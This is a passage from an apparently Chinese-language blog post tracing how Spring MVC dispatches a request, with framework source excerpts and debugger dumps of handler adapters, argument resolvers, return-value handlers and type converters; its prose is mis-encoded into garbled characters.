com.air.mvc.SampleController.echo(java.lang.String)&quot;</span><br></pre></td></tr></table></figure>
<h3 id="interceptor"><a href="#interceptor" class="headerlink" title="interceptor"></a>interceptor</h3><p><em>url -&gt; interceptors</em></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  /mvc/test</span></span><br><span class="line">String lookupPath = <span class="keyword">this</span>.urlPathHelper.getLookupPathForRequest(request);</span><br><span class="line">		<span class="keyword">for</span> (HandlerInterceptor interceptor : <span class="keyword">this</span>.adaptedInterceptors) &#123;</span><br><span class="line">			<span class="keyword">if</span> (interceptor <span class="keyword">instanceof</span> MappedInterceptor) &#123;</span><br><span class="line">				MappedInterceptor mappedInterceptor = (MappedInterceptor) interceptor;</span><br><span class="line">				<span class="keyword">if</span> (mappedInterceptor.matches(lookupPath, <span class="keyword">this</span>.pathMatcher)) &#123;</span><br><span class="line">					chain.addInterceptor(mappedInterceptor.getInterceptor());</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				chain.addInterceptor(interceptor);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
<h2 id="HandlerAdapter"><a href="#HandlerAdapter" class="headerlink" title="HandlerAdapter"></a>HandlerAdapter</h2><p><em>HandlerMethod -&gt; HandlerAdapter</em></p>
<p>// RequestMappingHandlerAdapter<br>org.springframework.web.servlet.DispatcherServlet#getHandlerAdapter</p>
<p>éå†æ‰€æœ‰çš„<code>HandlerAdapters</code>, æ‰¾åˆ°ç¬¬ä¸€ä¸ªèƒ½å¤„ç†çš„<code>HandlerAdapter</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> HandlerAdapter <span class="title">getHandlerAdapter</span><span class="params">(Object handler)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (HandlerAdapter ha : <span class="keyword">this</span>.handlerAdapters) &#123;</span><br><span class="line">			<span class="keyword">if</span> (logger.isTraceEnabled()) &#123;</span><br><span class="line">				logger.trace(<span class="string">"Testing handler adapter ["</span> + ha + <span class="string">"]"</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (ha.supports(handler)) &#123;</span><br><span class="line">				<span class="keyword">return</span> ha;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> ServletException(<span class="string">"No adapter for handler ["</span> + handler +</span><br><span class="line">				<span class="string">"]: The DispatcherServlet configuration needs to include a HandlerAdapter that supports this handler"</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>é»˜è®¤çš„<code>HandlerAdapters</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">this.handlerAdapters = &#123;ArrayList@5983&#125;  size = 3</span><br><span class="line"> 0 = &#123;RequestMappingHandlerAdapter@4845&#125; </span><br><span class="line"> 1 = &#123;HttpRequestHandlerAdapter@6268&#125; </span><br><span class="line"> 2 = &#123;SimpleControllerHandlerAdapter@6269&#125;</span><br></pre></td></tr></table></figure>
<p>æ¶‰åŠåˆ°çš„è¯·æ±‚å¤„ç†:</p>
<pre><code>a. org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter#invokeHandlerMethod
    è°ƒç”¨å¯¹åº”çš„controlleræ–¹æ³•

b. org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter#getModelAndView
    è¿”å›æ¨¡å‹å’Œè§†å›¾
</code></pre><h2 id="ServletInvocableHandlerMethod"><a href="#ServletInvocableHandlerMethod" class="headerlink" title="ServletInvocableHandlerMethod"></a>ServletInvocableHandlerMethod</h2><p><em>HandlerMethod -&gt; ServletInvocableHandlerMethod</em></p>
<p>org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod#invokeAndHandle</p>
<p>   a. InvocableHandlerMethod#invokeForRequest</p>
<pre><code>    1. è§£æä¼ é€’çš„å‚æ•°, å¿…è¦æ—¶è¿›è¡Œè½¬æ¢(resolverè´Ÿè´£æ˜ å°„è¾“å…¥çš„å‚æ•°åç§°å’Œcontrolleræ–¹æ³•å¯¹åº”çš„å‚æ•°, dataBinderè´Ÿè´£ç±»å‹è½¬æ¢å’Œæ ¡éªŒ)
    2. åå°„è°ƒç”¨å¯¹åº”çš„æ–¹æ³•

b. returnValueHandlers#handleReturnValue
    ä»æ‰€æœ‰çš„handlerä¸­æ‰¾åˆ°ç¬¬ä¸€ä¸ªæ”¯æŒå¯¹åº”è¿”å›å€¼ç±»å‹çš„å¤„ç†è¿”å›å€¼, å¯èƒ½æ¶‰åŠ`HttpMessageConverter`
</code></pre><h3 id="argumentResolvers"><a href="#argumentResolvers" class="headerlink" title="argumentResolvers"></a>argumentResolvers</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">this.argumentResolvers = &#123;HandlerMethodArgumentResolverComposite@4853&#125; </span><br><span class="line"> logger = &#123;SLF4JLocationAwareLog@6533&#125; </span><br><span class="line"> argumentResolvers = &#123;LinkedList@6534&#125;  size = 26</span><br><span class="line">  0 = &#123;RequestParamMethodArgumentResolver@5292&#125; </span><br><span class="line">  1 = &#123;RequestParamMapMethodArgumentResolver@6541&#125; </span><br><span class="line">  2 = &#123;PathVariableMethodArgumentResolver@6542&#125; </span><br><span class="line">  3 = &#123;PathVariableMapMethodArgumentResolver@6543&#125; </span><br><span class="line">  4 = &#123;MatrixVariableMethodArgumentResolver@6544&#125; </span><br><span class="line">  5 = &#123;MatrixVariableMapMethodArgumentResolver@6545&#125; </span><br><span class="line">  6 = &#123;ServletModelAttributeMethodProcessor@6546&#125; </span><br><span class="line">  7 = &#123;RequestResponseBodyMethodProcessor@6547&#125; </span><br><span class="line">  8 = &#123;RequestPartMethodArgumentResolver@6548&#125; </span><br><span class="line">  9 = &#123;RequestHeaderMethodArgumentResolver@6549&#125; </span><br><span class="line">  10 = &#123;RequestHeaderMapMethodArgumentResolver@6550&#125; </span><br><span class="line">  11 = &#123;ServletCookieValueMethodArgumentResolver@6551&#125; </span><br><span class="line">  12 = &#123;ExpressionValueMethodArgumentResolver@6552&#125; </span><br><span class="line">  13 = &#123;SessionAttributeMethodArgumentResolver@6553&#125; </span><br><span class="line">  14 = &#123;RequestAttributeMethodArgumentResolver@6554&#125; </span><br><span class="line">  15 = &#123;ServletRequestMethodArgumentResolver@6555&#125; </span><br><span class="line">  16 = &#123;ServletResponseMethodArgumentResolver@6556&#125; </span><br><span class="line">  17 = &#123;HttpEntityMethodProcessor@6557&#125; </span><br><span class="line">  18 = &#123;RedirectAttributesMethodArgumentResolver@6558&#125; </span><br><span class="line">  19 = &#123;ModelMethodProcessor@6559&#125; </span><br><span class="line">  20 = &#123;MapMethodProcessor@6560&#125; </span><br><span class="line">  21 = &#123;ErrorsMethodArgumentResolver@6561&#125; </span><br><span class="line">  22 = &#123;SessionStatusMethodArgumentResolver@6562&#125; </span><br><span class="line">  23 = &#123;UriComponentsBuilderMethodArgumentResolver@6563&#125; </span><br><span class="line">  24 = &#123;RequestParamMethodArgumentResolver@6564&#125; </span><br><span class="line">  25 = &#123;ServletModelAttributeMethodProcessor@6565&#125; </span><br><span class="line"> argumentResolverCache = &#123;ConcurrentHashMap@6535&#125;  size = 1</span><br><span class="line">  0 = &#123;ConcurrentHashMap$MapEntry@6538&#125; &quot;method &apos;echo&apos; parameter 0&quot; -&gt; </span><br><span class="line">   key = &#123;HandlerMethod$HandlerMethodParameter@5293&#125; &quot;method &apos;echo&apos; parameter 0&quot;</span><br><span class="line">   value = &#123;RequestParamMethodArgumentResolver@5292&#125;</span><br></pre></td></tr></table></figure>
<h3 id="returnValueHandlers"><a href="#returnValueHandlers" class="headerlink" title="returnValueHandlers"></a>returnValueHandlers</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">this.returnValueHandlers = &#123;HandlerMethodReturnValueHandlerComposite@4855&#125; </span><br><span class="line"> logger = &#123;SLF4JLocationAwareLog@6567&#125; </span><br><span class="line"> returnValueHandlers = &#123;ArrayList@6568&#125;  size = 15</span><br><span class="line">  0 = &#123;ModelAndViewMethodReturnValueHandler@6570&#125; </span><br><span class="line">  1 = &#123;ModelMethodProcessor@6571&#125; </span><br><span class="line">  2 = &#123;ViewMethodReturnValueHandler@6572&#125; </span><br><span class="line">  3 = &#123;ResponseBodyEmitterReturnValueHandler@6573&#125; </span><br><span class="line">  4 = &#123;StreamingResponseBodyReturnValueHandler@6574&#125; </span><br><span class="line">  5 = &#123;HttpEntityMethodProcessor@6575&#125; </span><br><span class="line">  6 = &#123;HttpHeadersReturnValueHandler@6576&#125; </span><br><span class="line">  7 = &#123;CallableMethodReturnValueHandler@6577&#125; </span><br><span class="line">  8 = &#123;DeferredResultMethodReturnValueHandler@6578&#125; </span><br><span class="line">  9 = &#123;AsyncTaskMethodReturnValueHandler@6579&#125; </span><br><span class="line">  10 = &#123;ModelAttributeMethodProcessor@6580&#125; </span><br><span class="line">  11 = &#123;RequestResponseBodyMethodProcessor@6581&#125; </span><br><span class="line">  12 = &#123;ViewNameMethodReturnValueHandler@6582&#125; </span><br><span class="line">  13 = &#123;MapMethodProcessor@6583&#125; </span><br><span class="line">  14 = &#123;ModelAttributeMethodProcessor@6584&#125;</span><br></pre></td></tr></table></figure>
<h3 id="binderFactory"><a href="#binderFactory" class="headerlink" title="binderFactory"></a>binderFactory</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line">binderFactory = &#123;ServletRequestDataBinderFactory@6498&#125; </span><br><span class="line"> binderMethods = &#123;ArrayList@6585&#125;  size = 0</span><br><span class="line"> initializer = &#123;ConfigurableWebBindingInitializer@4859&#125; </span><br><span class="line">  autoGrowNestedPaths = true</span><br><span class="line">  directFieldAccess = false</span><br><span class="line">  messageCodesResolver = null</span><br><span class="line">  bindingErrorProcessor = null</span><br><span class="line">  validator = null</span><br><span class="line">  conversionService = &#123;DefaultFormattingConversionService@6586&#125; &quot;ConversionService converters =\n\t@org.springframework.format.annotation.DateTimeFormat java.lang.Long -&gt; java.lang.String: org.springframework.format.datetime.DateTimeFormatAnnotationFormatterFactory@6e62d1c,@org.springframework.format.annotation.NumberFormat java.lang.Long -&gt; java.lang.String: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9\n\t@org.springframework.format.annotation.DateTimeFormat java.time.LocalDate -&gt; java.lang.String: org.springframework.format.datetime.standard.Jsr310DateTimeFormatAnnotationFormatterFactory@30fbf8e3,java.time.LocalDate -&gt; java.lang.String : org.springframework.format.datetime.standard.TemporalAccessorPrinter@4ec42ea0\n\t@org.springframework.format.annotation.DateTimeFormat java.time.LocalDateTime -&gt; java.lang.String: org.springframework.format.datetime.standard.Jsr310DateTimeFormatAnnotationFormatterFactory@30fbf8e3,java.time.LocalDateTime -&gt; java.lang.String : org.springframework.format.datetime.standard.TemporalAccess&quot;</span><br><span class="line">   embeddedValueResolver = &#123;EmbeddedValueResolver@6003&#125; </span><br><span class="line">   cachedPrinters = &#123;ConcurrentHashMap@6588&#125;  size = 0</span><br><span class="line">   cachedParsers = &#123;ConcurrentHashMap@6589&#125;  size = 0</span><br><span class="line">   converters = &#123;GenericConversionService$Converters@6590&#125; &quot;ConversionService converters =\n\t@org.springframework.format.annotation.DateTimeFormat java.lang.Long -&gt; java.lang.String: org.springframework.format.datetime.DateTimeFormatAnnotationFormatterFactory@6e62d1c,@org.springframework.format.annotation.NumberFormat java.lang.Long -&gt; java.lang.String: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9\n\t@org.springframework.format.annotation.DateTimeFormat java.time.LocalDate -&gt; java.lang.String: org.springframework.format.datetime.standard.Jsr310DateTimeFormatAnnotationFormatterFactory@30fbf8e3,java.time.LocalDate -&gt; java.lang.String : org.springframework.format.datetime.standard.TemporalAccessorPrinter@4ec42ea0\n\t@org.springframework.format.annotation.DateTimeFormat java.time.LocalDateTime -&gt; java.lang.String: org.springframework.format.datetime.standard.Jsr310DateTimeFormatAnnotationFormatterFactory@30fbf8e3,java.time.LocalDateTime -&gt; java.lang.String : org.springframework.format.datetime.standard.TemporalAccess&quot;</span><br><span class="line">    globalConverters = &#123;LinkedHashSet@6593&#125;  size = 0</span><br><span class="line">    converters = &#123;LinkedHashMap@6594&#125;  size = 118</span><br><span class="line">     0 = &#123;LinkedHashMap$Entry@6597&#125; &quot;java.lang.Number -&gt; java.lang.Number&quot; -&gt; &quot;java.lang.Number -&gt; java.lang.Number : org.springframework.core.convert.support.NumberToNumberConverterFactory@76561efa&quot;</span><br><span class="line">     1 = &#123;LinkedHashMap$Entry@6598&#125; &quot;java.lang.String -&gt; java.lang.Number&quot; -&gt; &quot;java.lang.String -&gt; java.lang.Number : org.springframework.core.convert.support.StringToNumberConverterFactory@1bf7855e&quot;</span><br><span class="line">     2 = &#123;LinkedHashMap$Entry@6599&#125; &quot;java.lang.Number -&gt; java.lang.String&quot; -&gt; &quot;java.lang.Number -&gt; java.lang.String : org.springframework.core.convert.support.ObjectToStringConverter@3932e255&quot;</span><br><span class="line">     3 = &#123;LinkedHashMap$Entry@6600&#125; &quot;java.lang.String -&gt; java.lang.Character&quot; -&gt; &quot;java.lang.String -&gt; java.lang.Character : org.springframework.core.convert.support.StringToCharacterConverter@55a6b63f&quot;</span><br><span class="line">     4 = &#123;LinkedHashMap$Entry@6601&#125; &quot;java.lang.Character -&gt; java.lang.String&quot; -&gt; &quot;java.lang.Character -&gt; java.lang.String : org.springframework.core.convert.support.ObjectToStringConverter@1341d3bf&quot;</span><br><span class="line">     5 = &#123;LinkedHashMap$Entry@6602&#125; &quot;java.lang.Number -&gt; java.lang.Character&quot; -&gt; &quot;java.lang.Number -&gt; java.lang.Character : org.springframework.core.convert.support.NumberToCharacterConverter@34bb79fc&quot;</span><br><span class="line">     6 = &#123;LinkedHashMap$Entry@6603&#125; &quot;java.lang.Character -&gt; java.lang.Number&quot; -&gt; &quot;java.lang.Character -&gt; java.lang.Number : org.springframework.core.convert.support.CharacterToNumberFactory@1ab51574&quot;</span><br><span class="line">     7 = &#123;LinkedHashMap$Entry@6604&#125; &quot;java.lang.String -&gt; java.lang.Boolean&quot; -&gt; &quot;java.lang.String -&gt; java.lang.Boolean : org.springframework.core.convert.support.StringToBooleanConverter@7ac24f53&quot;</span><br><span class="line">     8 = &#123;LinkedHashMap$Entry@6605&#125; &quot;java.lang.Boolean -&gt; java.lang.String&quot; -&gt; &quot;java.lang.Boolean -&gt; java.lang.String : org.springframework.core.convert.support.ObjectToStringConverter@6703b79f&quot;</span><br><span class="line">     9 = &#123;LinkedHashMap$Entry@6606&#125; &quot;java.lang.String -&gt; java.lang.Enum&quot; -&gt; &quot;java.lang.String -&gt; java.lang.Enum : org.springframework.core.convert.support.StringToEnumConverterFactory@898561a&quot;</span><br><span class="line">     10 = &#123;LinkedHashMap$Entry@6607&#125; &quot;java.lang.Enum -&gt; java.lang.String&quot; -&gt; &quot;java.lang.Enum -&gt; java.lang.String : org.springframework.core.convert.support.EnumToStringConverter@3a34ecc8&quot;</span><br><span class="line">     11 = &#123;LinkedHashMap$Entry@6608&#125; &quot;java.lang.Integer -&gt; java.lang.Enum&quot; -&gt; &quot;java.lang.Integer -&gt; java.lang.Enum : org.springframework.core.convert.support.IntegerToEnumConverterFactory@52e4840a&quot;</span><br><span class="line">     12 = &#123;LinkedHashMap$Entry@6609&#125; &quot;java.lang.Enum -&gt; java.lang.Integer&quot; -&gt; &quot;java.lang.Enum -&gt; java.lang.Integer : org.springframework.core.convert.support.EnumToIntegerConverter@28217e86&quot;</span><br><span class="line">     13 = &#123;LinkedHashMap$Entry@6610&#125; &quot;java.lang.String -&gt; java.util.Locale&quot; -&gt; &quot;java.lang.String -&gt; java.util.Locale : org.springframework.core.convert.support.StringToLocaleConverter@6243d51e&quot;</span><br><span class="line">     14 = &#123;LinkedHashMap$Entry@6611&#125; &quot;java.util.Locale -&gt; java.lang.String&quot; -&gt; &quot;java.util.Locale -&gt; java.lang.String : org.springframework.core.convert.support.ObjectToStringConverter@7f8c2732&quot;</span><br><span class="line">     15 = &#123;LinkedHashMap$Entry@6612&#125; &quot;java.lang.String -&gt; java.nio.charset.Charset&quot; -&gt; &quot;java.lang.String -&gt; java.nio.charset.Charset : org.springframework.core.convert.support.StringToCharsetConverter@93e281d&quot;</span><br><span class="line">     16 = &#123;LinkedHashMap$Entry@6613&#125; &quot;java.nio.charset.Charset -&gt; java.lang.String&quot; -&gt; &quot;java.nio.charset.Charset -&gt; java.lang.String : org.springframework.core.convert.support.ObjectToStringConverter@2ac8a2f2&quot;</span><br><span class="line">     17 = &#123;LinkedHashMap$Entry@6614&#125; &quot;java.lang.String -&gt; java.util.Currency&quot; -&gt; &quot;java.lang.String -&gt; java.util.Currency : org.springframework.core.convert.support.StringToCurrencyConverter@565f7990&quot;</span><br><span class="line">     18 = &#123;LinkedHashMap$Entry@6615&#125; &quot;java.util.Currency -&gt; java.lang.String&quot; -&gt; &quot;java.util.Currency -&gt; java.lang.String : org.springframework.core.convert.support.ObjectToStringConverter@487461de&quot;</span><br><span class="line">     19 = &#123;LinkedHashMap$Entry@6616&#125; &quot;java.lang.String -&gt; java.util.Properties&quot; -&gt; &quot;java.lang.String -&gt; java.util.Properties : org.springframework.core.convert.support.StringToPropertiesConverter@3072d60d&quot;</span><br><span class="line">     20 = &#123;LinkedHashMap$Entry@6617&#125; &quot;java.util.Properties -&gt; java.lang.String&quot; -&gt; &quot;java.util.Properties -&gt; java.lang.String : org.springframework.core.convert.support.PropertiesToStringConverter@5f423dc3&quot;</span><br><span class="line">     21 = &#123;LinkedHashMap$Entry@6618&#125; &quot;java.lang.String -&gt; java.util.UUID&quot; -&gt; &quot;java.lang.String -&gt; java.util.UUID : org.springframework.core.convert.support.StringToUUIDConverter@72fc4c42&quot;</span><br><span class="line">     22 = &#123;LinkedHashMap$Entry@6619&#125; &quot;java.util.UUID -&gt; java.lang.String&quot; -&gt; &quot;java.util.UUID -&gt; java.lang.String : org.springframework.core.convert.support.ObjectToStringConverter@196db952&quot;</span><br><span class="line">     23 = &#123;LinkedHashMap$Entry@6620&#125; &quot;[Ljava.lang.Object; -&gt; java.util.Collection&quot; -&gt; &quot;org.springframework.core.convert.support.ArrayToCollectionConverter@3f09c6cc&quot;</span><br><span class="line">     24 = &#123;LinkedHashMap$Entry@6621&#125; &quot;java.util.Collection -&gt; [Ljava.lang.Object;&quot; -&gt; &quot;org.springframework.core.convert.support.CollectionToArrayConverter@716b58cb&quot;</span><br><span class="line">     25 = &#123;LinkedHashMap$Entry@6622&#125; &quot;[Ljava.lang.Object; -&gt; [Ljava.lang.Object;&quot; -&gt; &quot;org.springframework.core.convert.support.ArrayToArrayConverter@61e594f8&quot;</span><br><span class="line">     26 = &#123;LinkedHashMap$Entry@6623&#125; &quot;java.util.Collection -&gt; java.util.Collection&quot; -&gt; &quot;org.springframework.core.convert.support.CollectionToCollectionConverter@153616bf&quot;</span><br><span class="line">     27 = &#123;LinkedHashMap$Entry@6624&#125; &quot;java.util.Map -&gt; java.util.Map&quot; -&gt; &quot;org.springframework.core.convert.support.MapToMapConverter@64f88d73&quot;</span><br><span class="line">     28 = &#123;LinkedHashMap$Entry@6625&#125; &quot;[Ljava.lang.Object; -&gt; java.lang.String&quot; -&gt; &quot;org.springframework.core.convert.support.ArrayToStringConverter@4f7e3c27&quot;</span><br><span class="line">     29 = &#123;LinkedHashMap$Entry@6626&#125; &quot;java.lang.String -&gt; [Ljava.lang.Object;&quot; -&gt; &quot;org.springframework.core.convert.support.StringToArrayConverter@2713364&quot;</span><br><span class="line">     30 = &#123;LinkedHashMap$Entry@6627&#125; &quot;[Ljava.lang.Object; -&gt; java.lang.Object&quot; -&gt; &quot;org.springframework.core.convert.support.ArrayToObjectConverter@27574e7b&quot;</span><br><span class="line">     31 = &#123;LinkedHashMap$Entry@6628&#125; &quot;java.lang.Object -&gt; [Ljava.lang.Object;&quot; -&gt; &quot;org.springframework.core.convert.support.ObjectToArrayConverter@7e4ccf7&quot;</span><br><span class="line">     32 = &#123;LinkedHashMap$Entry@6629&#125; &quot;java.util.Collection -&gt; java.lang.String&quot; -&gt; &quot;org.springframework.core.convert.support.CollectionToStringConverter@39455728&quot;</span><br><span class="line">     33 = &#123;LinkedHashMap$Entry@6630&#125; &quot;java.lang.String -&gt; java.util.Collection&quot; -&gt; &quot;org.springframework.core.convert.support.StringToCollectionConverter@32a4a977&quot;</span><br><span class="line">     34 = &#123;LinkedHashMap$Entry@6631&#125; &quot;java.util.Collection -&gt; java.lang.Object&quot; -&gt; &quot;org.springframework.core.convert.support.CollectionToObjectConverter@2f1d1dce&quot;</span><br><span class="line">     35 = &#123;LinkedHashMap$Entry@6632&#125; &quot;java.lang.Object -&gt; java.util.Collection&quot; -&gt; &quot;org.springframework.core.convert.support.ObjectToCollectionConverter@ebfffae&quot;</span><br><span class="line">     36 = &#123;LinkedHashMap$Entry@6633&#125; &quot;[Ljava.lang.Object; -&gt; java.util.stream.Stream&quot; -&gt; &quot;org.springframework.core.convert.support.StreamConverter@1d500546&quot;</span><br><span class="line">     37 = &#123;LinkedHashMap$Entry@6634&#125; &quot;java.util.Collection -&gt; java.util.stream.Stream&quot; -&gt; &quot;org.springframework.core.convert.support.StreamConverter@1d500546&quot;</span><br><span class="line">     38 = &#123;LinkedHashMap$Entry@6635&#125; &quot;java.util.stream.Stream -&gt; java.util.Collection&quot; -&gt; &quot;org.springframework.core.convert.support.StreamConverter@1d500546&quot;</span><br><span class="line">     39 = &#123;LinkedHashMap$Entry@6636&#125; &quot;java.util.stream.Stream -&gt; [Ljava.lang.Object;&quot; -&gt; &quot;org.springframework.core.convert.support.StreamConverter@1d500546&quot;</span><br><span class="line">     40 = &#123;LinkedHashMap$Entry@6637&#125; &quot;java.nio.ByteBuffer -&gt; [B&quot; -&gt; &quot;org.springframework.core.convert.support.ByteBufferConverter@aa8e88a&quot;</span><br><span class="line">     41 = &#123;LinkedHashMap$Entry@6638&#125; &quot;java.nio.ByteBuffer -&gt; java.lang.Object&quot; -&gt; &quot;org.springframework.core.convert.support.ByteBufferConverter@aa8e88a&quot;</span><br><span class="line">     42 = &#123;LinkedHashMap$Entry@6639&#125; &quot;java.lang.Object -&gt; java.nio.ByteBuffer&quot; -&gt; &quot;org.springframework.core.convert.support.ByteBufferConverter@aa8e88a&quot;</span><br><span class="line">     43 = &#123;LinkedHashMap$Entry@6640&#125; &quot;[B -&gt; java.nio.ByteBuffer&quot; -&gt; &quot;org.springframework.core.convert.support.ByteBufferConverter@aa8e88a&quot;</span><br><span class="line">     44 = &#123;LinkedHashMap$Entry@6641&#125; &quot;java.lang.String -&gt; java.util.TimeZone&quot; -&gt; &quot;java.lang.String -&gt; java.util.TimeZone : org.springframework.core.convert.support.StringToTimeZoneConverter@4d1c677c&quot;</span><br><span class="line">     45 = &#123;LinkedHashMap$Entry@6642&#125; &quot;java.time.ZoneId -&gt; java.util.TimeZone&quot; -&gt; &quot;java.time.ZoneId -&gt; java.util.TimeZone : org.springframework.core.convert.support.ZoneIdToTimeZoneConverter@3c2fb3fe&quot;</span><br><span class="line">     46 = &#123;LinkedHashMap$Entry@6643&#125; &quot;java.time.ZonedDateTime -&gt; java.util.Calendar&quot; -&gt; &quot;java.time.ZonedDateTime -&gt; java.util.Calendar : org.springframework.core.convert.support.ZonedDateTimeToCalendarConverter@2148eb08&quot;</span><br><span class="line">     47 = &#123;LinkedHashMap$Entry@6644&#125; &quot;java.lang.Object -&gt; java.lang.Object&quot; -&gt; &quot;org.springframework.core.convert.support.IdToEntityConverter@6c69ab13,org.springframework.core.convert.support.ObjectToObjectConverter@42600665&quot;</span><br><span class="line">     48 = &#123;LinkedHashMap$Entry@6645&#125; &quot;java.lang.Object -&gt; java.lang.String&quot; -&gt; &quot;org.springframework.core.convert.support.FallbackObjectToStringConverter@311fd94&quot;</span><br><span class="line">     49 = &#123;LinkedHashMap$Entry@6646&#125; &quot;java.lang.Object -&gt; java.util.Optional&quot; -&gt; &quot;org.springframework.core.convert.support.ObjectToOptionalConverter@65e75655&quot;</span><br><span class="line">     50 = &#123;LinkedHashMap$Entry@6647&#125; &quot;java.lang.Integer -&gt; java.lang.String&quot; -&gt; &quot;@org.springframework.format.annotation.NumberFormat java.lang.Integer -&gt; java.lang.String: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     51 = &#123;LinkedHashMap$Entry@6648&#125; &quot;java.lang.String -&gt; java.lang.Integer&quot; -&gt; &quot;java.lang.String -&gt; @org.springframework.format.annotation.NumberFormat java.lang.Integer: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     52 = &#123;LinkedHashMap$Entry@6649&#125; &quot;java.lang.Float -&gt; java.lang.String&quot; -&gt; &quot;@org.springframework.format.annotation.NumberFormat java.lang.Float -&gt; java.lang.String: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     53 = &#123;LinkedHashMap$Entry@6650&#125; &quot;java.lang.String 